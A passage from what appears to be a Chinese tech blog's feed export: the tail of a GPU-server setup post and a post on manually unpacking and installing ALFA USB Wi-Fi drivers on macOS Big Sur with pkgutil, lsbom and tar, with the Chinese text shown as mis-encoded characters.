class="line">|&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;+&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;+&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;|</span><br><span class="line">|   0  A100-PCIE-40GB      Off  | 00000000:03:00.0 Off |                    0 |</span><br><span class="line">| N&#x2F;A   28C    P0    31W &#x2F; 250W |      0MiB &#x2F; 40537MiB |      0%      Default |</span><br><span class="line">|                               |                      |             Disabled |</span><br><span class="line">+-------------------------------+----------------------+----------------------+</span><br><span class="line">|   1  GeForce RTX 208...  Off  | 00000000:05:00.0 Off |                  N&#x2F;A |</span><br><span class="line">| 30%   38C    P8    16W &#x2F; 250W |      0MiB &#x2F; 11019MiB |      0%      Default |</span><br><span class="line">|                               |                      |                  N&#x2F;A |</span><br><span class="line">+-------------------------------+----------------------+----------------------+</span><br><span class="line">|   2  GeForce RTX 208...  Off  | 00000000:06:00.0 Off |                  N&#x2F;A |</span><br><span class="line">| 29%   37C    P8    19W &#x2F; 250W |      0MiB &#x2F; 11019MiB |      0%      Default |</span><br><span class="line">|                               |                      |                  N&#x2F;A |</span><br><span class="line">+-------------------------------+----------------------+----------------------+</span><br><span class="line">|   3  Tesla V100-PCIE...  Off  | 00000000:0C:00.0 Off |                    0 |</span><br><span class="line">| N&#x2F;A   29C    P0    26W &#x2F; 250W |      0MiB &#x2F; 32510MiB |      0%      Default |</span><br><span class="line">|                               |                      |                  N&#x2F;A |</span><br><span class="line">+-------------------------------+----------------------+----------------------+</span><br><span class="line">|   4  GeForce RTX 208...  Off  | 00000000:14:00.0 Off |                  N&#x2F;A |</span><br><span class="line">| 28%   39C    P8     2W &#x2F; 250W |      0MiB &#x2F; 11019MiB |      0%      Default |</span><br><span class="line">|                               |                      |                  N&#x2F;A |</span><br><span class="line">+-------------------------------+----------------------+----------------------+</span><br><span class="line">|   5  Tesla V100-PCIE...  Off  | 00000000:15:00.0 Off |                    0 |</span><br><span class="line">| N&#x2F;A   29C    P0    24W &#x2F; 250W |      0MiB &#x2F; 32510MiB |      0%      Default |</span><br><span class="line">|                               |                      |                  N&#x2F;A |</span><br><span class="line">+-------------------------------+----------------------+----------------------+</span><br><span class="line">|   6  GeForce RTX 208...  Off  | 00000000:16:00.0 Off |                  N&#x2F;A |</span><br><span class="line">| 27%   38C    P8     2W &#x2F; 250W |      0MiB &#x2F; 11019MiB |      0%      Default |</span><br><span class="line">|                               |                      |                  N&#x2F;A |</span><br><span class="line">+-------------------------------+----------------------+----------------------+</span><br></pre></td></tr></table></figure>

<h2 id="ç½‘ç»œåˆ’åˆ†"><a href="#ç½‘ç»œåˆ’åˆ†" class="headerlink" title="ç½‘ç»œåˆ’åˆ†"></a>ç½‘ç»œåˆ’åˆ†</h2><p>åœ¨ ESXi é‡Œå¢åŠ äº†ä¸€ä¸ª OpenWrt ç½‘å…³ä½œä¸º GPU Server çš„ä¸Šçº§è·¯ç”±ï¼Œå‚è€ƒ<span class="exturl" data-url="aHR0cHM6Ly9mb29sZW5nLmNvbS8yMDIwLzAzLzEwL3Ztd2FyZS1lc3hpLXNpbmdsZV9pcF9mb3JfbmF0Lw==" title="https://fooleng.com/2020/03/10/vmware-esxi-single_ip_for_nat/">â€œVMWARE ESXI ä½¿ç”¨å•ä¸ªå¤–ç½‘IPåœ°å€å®ç°NATâ€<i class="fa fa-external-link"></i></span>è¿™ç¯‡æ–‡ç« ï¼Œä½¿ç”¨é™¤åŸ manage network ä¹‹å¤–é¢å¤–çš„ IP è¿›è¡Œå¸¸è§„ç½‘ç»œè®¿é—®ï¼ˆåŒ IP ä¸€ä¸ªç»™è·¯ç”± WANï¼Œä¸€ä¸ªç»™ manageï¼‰</p>
<p>ç±»ä¼¼ä¸‹å›¾ç»“æ„ã€‚</p>
<img src="/2021/01/04/2021-01-04/vm-lan.png" class="">]]></content>
      <categories>
        <category>tech</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>vmware</tag>
        <tag>ESXi</tag>
        <tag>environment</tag>
        <tag>nvidia</tag>
        <tag>deeplearning</tag>
      </tags>
  </entry>
  <entry>
    <title>macOS 11.2.3 Big Sur å®‰è£… ALFA ç½‘å¡é©±åŠ¨</title>
    <url>/2021/03/20/2021-03-20/</url>
    <content><![CDATA[<p>æ‰‹å¤´æœ‰ä¸¤å¼  alfa ç½‘å¡æƒ³è¦åœ¨ mac ä¸‹ç›´æ¥ä½¿ç”¨ï¼Œå®˜ç½‘é©±åŠ¨<span class="exturl" data-url="aHR0cHM6Ly9maWxlcy5hbGZhLmNvbS50dy8/ZGlyPSU1QjElNUQlMjBXaUZpJTIwVVNCJTIwYWRhcHRlciUyRkFXVVMwMzZBQ0glMkZNQUMlMjBPUw==" title="https://files.alfa.com.tw/?dir=%5B1%5D%20WiFi%20USB%20adapter%2FAWUS036ACH%2FMAC%20OS">AWUS036ACH<i class="fa fa-external-link"></i></span>å’Œ<span class="exturl" data-url="aHR0cHM6Ly9maWxlcy5hbGZhLmNvbS50dy8/ZGlyPSU1QjElNUQlMjBXaUZpJTIwVVNCJTIwYWRhcHRlci9BV1VTMDUxTkglMjB2Mi9NQUMlMjBPUw==" title="https://files.alfa.com.tw/?dir=%5B1%5D%20WiFi%20USB%20adapter/AWUS051NH%20v2/MAC%20OS">AWUS051NH v2<i class="fa fa-external-link"></i></span>æœ€æ–°çš„éƒ½åªåˆ°10.14ã€10.15çš„æ ·å­ï¼Œä¸‹è½½äº†å‡ ä¸ªç‰ˆæœ¬çš„é©±åŠ¨å‘ç°åŒå‹å·çš„binaryå·®å¼‚éƒ½ä¸å¤§ï¼Œè¿™é‡Œå°è¯•æ‰‹åŠ¨æŠŠå®‰è£…åŒ…è§£åŒ…è¿›è¡Œå®‰è£…ã€‚</p>
<a id="more"></a>

<h3 id="ä¸‹è½½å¹¶æŸ¥çœ‹ä¿¡æ¯"><a href="#ä¸‹è½½å¹¶æŸ¥çœ‹ä¿¡æ¯" class="headerlink" title="ä¸‹è½½å¹¶æŸ¥çœ‹ä¿¡æ¯"></a>ä¸‹è½½å¹¶æŸ¥çœ‹ä¿¡æ¯</h3><p>ä»¥ AWUS036ACH ä¸ºä¾‹ï¼Œä¸‹è½½<span class="exturl" data-url="aHR0cHM6Ly9maWxlcy5hbGZhLmNvbS50dy8lNUIxJTVEJTIwV2lGaSUyMFVTQiUyMGFkYXB0ZXIvQVdVUzAzNkFDSC9NQUMlMjBPUy9NQUNPUzEwLjE1L0FMRkElMjBVU0IlMjBXaUZpJTIwRHJpdmVyJTIwJTI4QnVpbGQlMjAwOTE5JTI5LnBrZw==" title="https://files.alfa.com.tw/%5B1%5D%20WiFi%20USB%20adapter/AWUS036ACH/MAC%20OS/MACOS10.15/ALFA%20USB%20WiFi%20Driver%20%28Build%200919%29.pkg">é’ˆå¯¹10.15ç‰ˆæœ¬çš„ç³»ç»Ÿå®‰è£…åŒ…<i class="fa fa-external-link"></i></span>ï¼Œä½¿ç”¨å¦‚ä¸‹å‘½ä»¤è§£å‹ï¼Œå¹¶æŸ¥çœ‹å®‰è£…æ–‡ä»¶ä¿¡æ¯</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"> test@mac:~/Downloads/alfa_036ach$ pkgutil --expand ALFA\ USB\ WiFi\ Driver\ \(Build\ 0919\).pkg 036install/</span><br><span class="line"> test@mac:~/Downloads/alfa_036ach$ cd 036install</span><br><span class="line"> test@mac:~/Downloads/alfa_036ach/036install$ for bom in `find ./ -name Bom`;do echo &quot;\n$bom\n&quot;;lsbom $bom;done</span><br><span class="line"></span><br><span class="line">.//Uninstall.pkg/Bom</span><br><span class="line"></span><br><span class="line">.	40755	0/0</span><br><span class="line"></span><br><span class="line">.//RealtekUtility1014.pkg/Bom</span><br><span class="line"></span><br><span class="line">.	40755	0/0</span><br><span class="line">./Library	40755	0/0</span><br><span class="line">./Library/Application Support	40755	0/80</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI	40755	0/80</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/RtWlanHelper	100777	0/80	164912	4191442806</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app	40777	0/80</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents	40777	0/80</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Info.plist	100777	0/80	6912	230658313</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/MacOS	40777	0/80</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/MacOS/StatusBarApp	100777	0/80	2189968	3628228103</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/MacOS/UnPref	100777	0/80	19344	3878423580</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/MacOS/wpa_supplicant	100777	0/80	3701248	1599320216</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/PkgInfo	100777	0/80	8	742937289</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources	40777	0/80</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/BarConnecting_0.pdf	100777	0/80	36603	1484869705</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/BarConnecting_1.pdf	100777	0/80	37352	4181603319</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/BarConnecting_2.pdf	100777	0/80	37611	4109256582</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/BarConnecting_3.pdf	100777	0/80	37995	1459662728</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/BarSignal_0.icns	100777	0/80	26462	3234730549</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/BarSignal_1.icns	100777	0/80	26210	1286484566</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/BarSignal_2.icns	100777	0/80	25792	62513264</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/BarSignal_3.icns	100777	0/80	25052	387852725</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/BarSignal_4.icns	100777	0/80	24425	1078631272</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/BarSignal_5.icns	100777	0/80	23334	3487072564</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/BarSignal_disconnect.icns	100777	0/80	26823	1316734277</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/Danish.lproj	40777	0/80</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/Danish.lproj/Localizable.strings	100777	0/80	14800	3311744630</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/Dutch.lproj	40777	0/80</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/Dutch.lproj/Localizable.strings	100777	0/80	15790	4268595270</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/English.lproj	40777	0/80</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/English.lproj/InfoPlist.strings	100777	0/80	216	2032630058</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/English.lproj/Localizable.strings	100777	0/80	14532	3333036018</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/English.lproj/MainMenu.nib	100777	0/80	116130	1180232894</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/French.lproj	40777	0/80</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/French.lproj/Localizable.strings	100777	0/80	16772	3843437997</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/German.lproj	40777	0/80</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/German.lproj/Localizable.strings	100777	0/80	16404	3871974471</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/InvalidCertStack.png	100777	0/80	4115	405799571</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/Italian.lproj	40777	0/80</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/Italian.lproj/Localizable.strings	100777	0/80	16026	896400443</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/Japanese.lproj	40777	0/80</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/Japanese.lproj/Localizable.strings	100777	0/80	11934	4027295540</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/Korean.lproj	40777	0/80</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/Korean.lproj/Localizable.strings	100777	0/80	11876	2624905898</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/Light_green.tif	100777	0/80	842	74228462</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/Light_red.tif	100777	0/80	844	665447662</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/Light_yellow.tif	100777	0/80	842	1768653772</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/ModelIcon.icns	100777	0/80	51594	129970855</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/Polish.lproj	40777	0/80</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/Polish.lproj/Localizable.strings	100777	0/80	15676	3136865389</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/Russian.lproj	40777	0/80</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/Russian.lproj/Localizable.strings	100777	0/80	15576	2073104601</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/ScanListSignal_0.pdf	100777	0/80	20591	945318973</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/ScanListSignal_1.pdf	100777	0/80	19276	2457190938</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/ScanListSignal_2.pdf	100777	0/80	18988	307059393</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/ScanListSignal_3.pdf	100777	0/80	20320	3211105751</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/ScanListSignal_4.pdf	100777	0/80	21377	2949361981</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/Spanish.lproj	40777	0/80</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/Spanish.lproj/Localizable.strings	100777	0/80	15638	2882256134</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/Swedish.lproj	40777	0/80</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/Swedish.lproj/Localizable.strings	100777	0/80	14980	2069709247</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/TrashCan_b.png	100777	0/80	3891	3343055356</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/Turkish.lproj	40777	0/80</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/Turkish.lproj/Localizable.strings	100777	0/80	14634	1917276981</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/USBWiFi.ico	100777	0/80	2238	3372210440</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/USBWiFi_Unplug.ico	100777	0/80	4414	219813042</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/Uninstall.command	100777	0/80	5707	547532281</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/WPShorizstring.png	100777	0/80	6193	2473263293</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/WPSstring.png	100777	0/80	3223	3739536898</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/arrow2.icns	100777	0/80	8457	2504247864</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/blank.icns	100777	0/80	12	2036916336</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/check_b.icns	100777	0/80	44963	3482095838</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/check_g.icns	100777	0/80	45808	477943401</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/error_b.icns	100777	0/80	9248	1553716514</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/error_r.icns	100777	0/80	87439	3460119953</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/fr-CA.lproj	40777	0/80</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/fr-CA.lproj/Localizable.strings	100777	0/80	16432	2886202537</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/info_b.icns	100777	0/80	7403	1160116236</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/locked_b.icns	100777	0/80	129058	989106223</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/locked_w.icns	100777	0/80	2998	2814166388</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/locked_w.png	100777	0/80	1206	3039885116</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/pt-PT.lproj	40777	0/80</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/pt-PT.lproj/Localizable.strings	100777	0/80	15492	1861649393</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/_CodeSignature	40777	0/80</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/_CodeSignature/CodeResources	100777	0/80	18298	1953610339</span><br><span class="line"></span><br><span class="line">.//MediatekSerialsInstaller.pkg/Bom</span><br><span class="line"></span><br><span class="line">.	40755	0/0</span><br><span class="line"></span><br><span class="line">.//RealtekSerialsInstaller.pkg/Bom</span><br><span class="line"></span><br><span class="line">.	40755	0/0</span><br><span class="line"></span><br><span class="line">.//Realtek_Uninstall.pkg/Bom</span><br><span class="line"></span><br><span class="line">.	40755	0/0</span><br><span class="line"></span><br><span class="line">.//Realtek109110Driver.pkg/Bom</span><br><span class="line"></span><br><span class="line">.	40755	0/0</span><br><span class="line">./Library	40755	0/0</span><br><span class="line">./Library/Extensions	40755	0/0</span><br><span class="line">./Library/Extensions/RtWlanDisk.kext	40755	0/0</span><br><span class="line">./Library/Extensions/RtWlanDisk.kext/Contents	40755	0/0</span><br><span class="line">./Library/Extensions/RtWlanDisk.kext/Contents/Info.plist	100644	0/0	2919	2283574063</span><br><span class="line">./Library/Extensions/RtWlanDisk.kext/Contents/MacOS	40755	0/0</span><br><span class="line">./Library/Extensions/RtWlanDisk.kext/Contents/MacOS/RtWlanDisk	100755	0/0	59536	2524314782</span><br><span class="line">./Library/Extensions/RtWlanDisk.kext/Contents/_CodeSignature	40755	0/0</span><br><span class="line">./Library/Extensions/RtWlanDisk.kext/Contents/_CodeSignature/CodeResources	100644	0/0	2004	655202299</span><br><span class="line">./Library/Extensions/RtWlanU.kext	40755	0/0</span><br><span class="line">./Library/Extensions/RtWlanU.kext/Contents	40755	0/0</span><br><span class="line">./Library/Extensions/RtWlanU.kext/Contents/Info.plist	100644	0/0	77753	2727324424</span><br><span class="line">./Library/Extensions/RtWlanU.kext/Contents/MacOS	40755	0/0</span><br><span class="line">./Library/Extensions/RtWlanU.kext/Contents/MacOS/RtWlanU	100755	0/0	14733120	1913417689</span><br><span class="line">./Library/Extensions/RtWlanU.kext/Contents/_CodeSignature	40755	0/0</span><br><span class="line">./Library/Extensions/RtWlanU.kext/Contents/_CodeSignature/CodeResources	100644	0/0	2004	655202299</span><br><span class="line">./Library/Extensions/RtWlanU1827.kext	40755	0/0</span><br><span class="line">./Library/Extensions/RtWlanU1827.kext/Contents	40755	0/0</span><br><span class="line">./Library/Extensions/RtWlanU1827.kext/Contents/Info.plist	100644	0/0	45890	1963117974</span><br><span class="line">./Library/Extensions/RtWlanU1827.kext/Contents/MacOS	40755	0/0</span><br><span class="line">./Library/Extensions/RtWlanU1827.kext/Contents/MacOS/RtWlanU1827	100755	0/0	4521104	3396109984</span><br><span class="line">./Library/Extensions/RtWlanU1827.kext/Contents/_CodeSignature	40755	0/0</span><br><span class="line">./Library/Extensions/RtWlanU1827.kext/Contents/_CodeSignature/CodeResources	100644	0/0	2004	655202299</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°åªæœ‰ RealtekUtility1014.pkg å’Œ Realtek109110Driver.pkg ä¸¤ä¸ªåŒ…é‡Œé¢æœ‰ä¸œè¥¿ï¼Œç¬¬ä¸€ä¸ªæ˜¯å·¥å…·ç¨‹åºï¼Œç¬¬äºŒä¸ªæ˜¯é©±åŠ¨ã€‚</p>
<p>è¿›å…¥é©±åŠ¨ç›®å½•ï¼ŒæŸ¥çœ‹PackageInfoå†…å®¹ï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">pkg-info</span> <span class="attr">format-version</span>=<span class="string">&quot;2&quot;</span> <span class="attr">identifier</span>=<span class="string">&quot;com.alfa-network-inc.Realtek109Driver&quot;</span> <span class="attr">version</span>=<span class="string">&quot;10.9&quot;</span> <span class="attr">relocatable</span>=<span class="string">&quot;false&quot;</span> <span class="attr">overwrite-permissions</span>=<span class="string">&quot;false&quot;</span> <span class="attr">followSymLinks</span>=<span class="string">&quot;false&quot;</span> <span class="attr">install-location</span>=<span class="string">&quot;/&quot;</span> <span class="attr">auth</span>=<span class="string">&quot;root&quot;</span> <span class="attr">postinstall-action</span>=<span class="string">&quot;restart&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">payload</span> <span class="attr">installKBytes</span>=<span class="string">&quot;18992&quot;</span> <span class="attr">numberOfFiles</span>=<span class="string">&quot;24&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">scripts</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">preinstall</span> <span class="attr">file</span>=<span class="string">&quot;./preinstall&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">postinstall</span> <span class="attr">file</span>=<span class="string">&quot;./postinstall&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">scripts</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bundle-version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bundle</span> <span class="attr">path</span>=<span class="string">&quot;./Library/Extensions/RtWlanDisk.kext&quot;</span> <span class="attr">CFBundleShortVersionString</span>=<span class="string">&quot;1830.20.b31&quot;</span> <span class="attr">CFBundleVersion</span>=<span class="string">&quot;1830.20.b31&quot;</span> <span class="attr">id</span>=<span class="string">&quot;com.realtek.driver.RtWlanDisk&quot;</span> <span class="attr">CFBundleIdentifier</span>=<span class="string">&quot;com.realtek.driver.RtWlanDisk&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bundle</span> <span class="attr">path</span>=<span class="string">&quot;./Library/Extensions/RtWlanU1827.kext&quot;</span> <span class="attr">CFBundleShortVersionString</span>=<span class="string">&quot;1827.4.b32&quot;</span> <span class="attr">CFBundleVersion</span>=<span class="string">&quot;1827.4.b32&quot;</span> <span class="attr">id</span>=<span class="string">&quot;com.realtek.driver.RtWlanU1827&quot;</span> <span class="attr">CFBundleIdentifier</span>=<span class="string">&quot;com.realtek.driver.RtWlanU1827&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bundle</span> <span class="attr">path</span>=<span class="string">&quot;./Library/Extensions/RtWlanU.kext&quot;</span> <span class="attr">CFBundleShortVersionString</span>=<span class="string">&quot;1830.20.b31&quot;</span> <span class="attr">CFBundleVersion</span>=<span class="string">&quot;1830.20.b31&quot;</span> <span class="attr">id</span>=<span class="string">&quot;com.realtek.driver.RtWlanU&quot;</span> <span class="attr">CFBundleIdentifier</span>=<span class="string">&quot;com.realtek.driver.RtWlanU&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bundle-version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">pkg-info</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="è§£å‹é©±åŠ¨åŒ…"><a href="#è§£å‹é©±åŠ¨åŒ…" class="headerlink" title="è§£å‹é©±åŠ¨åŒ…"></a>è§£å‹é©±åŠ¨åŒ…</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">test@mac:~/Downloads/alfa_036ach/036install/Realtek109110Driver.pkg$ mkdir payload.dir ; cd payload.dir</span><br><span class="line">test@mac:~/Downloads/alfa_036ach/036install/Realtek109110Driver.pkg/payload.dir$ tar -xvf ../Payload ; cd ..</span><br><span class="line">x .</span><br><span class="line">x ./Library</span><br><span class="line">x ./Library/Extensions</span><br><span class="line">x ./Library/Extensions/RtWlanDisk.kext</span><br><span class="line">x ./Library/Extensions/RtWlanDisk.kext/Contents</span><br><span class="line">x ./Library/Extensions/RtWlanDisk.kext/Contents/_CodeSignature</span><br><span class="line">x ./Library/Extensions/RtWlanDisk.kext/Contents/_CodeSignature/CodeResources</span><br><span class="line">x ./Library/Extensions/RtWlanDisk.kext/Contents/MacOS</span><br><span class="line">x ./Library/Extensions/RtWlanDisk.kext/Contents/MacOS/RtWlanDisk</span><br><span class="line">x ./Library/Extensions/RtWlanDisk.kext/Contents/Info.plist</span><br><span class="line">x ./Library/Extensions/RtWlanU1827.kext</span><br><span class="line">x ./Library/Extensions/RtWlanU1827.kext/Contents</span><br><span class="line">x ./Library/Extensions/RtWlanU1827.kext/Contents/_CodeSignature</span><br><span class="line">x ./Library/Extensions/RtWlanU1827.kext/Contents/_CodeSignature/CodeResources</span><br><span class="line">x ./Library/Extensions/RtWlanU1827.kext/Contents/MacOS</span><br><span class="line">x ./Library/Extensions/RtWlanU1827.kext/Contents/MacOS/RtWlanU1827</span><br><span class="line">x ./Library/Extensions/RtWlanU1827.kext/Contents/Info.plist</span><br><span class="line">x ./Library/Extensions/RtWlanU.kext</span><br><span class="line">x ./Library/Extensions/RtWlanU.kext/Contents</span><br><span class="line">x ./Library/Extensions/RtWlanU.kext/Contents/_CodeSignature</span><br><span class="line">x ./Library/Extensions/RtWlanU.kext/Contents/_CodeSignature/CodeResources</span><br><span class="line">x ./Library/Extensions/RtWlanU.kext/Contents/MacOS</span><br><span class="line">x ./Library/Extensions/RtWlanU.kext/Contents/MacOS/RtWlanU</span><br><span class="line">x ./Library/Extensions/RtWlanU.kext/Contents/Info.plist</span><br></pre></td></tr></table></figure>

<h3 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h3><p>å‚è€ƒ Scripts ä¸‹çš„ preinstall å’Œ postinstallï¼Œä¿®æ”¹è„šæœ¬ä¸­çš„ç›¸å¯¹è·¯å¾„ï¼Œæ‰§è¡Œç›¸å…³å‘½ä»¤å®‰è£…ã€‚</p>
<p><strong>preinstall</strong> :</p>
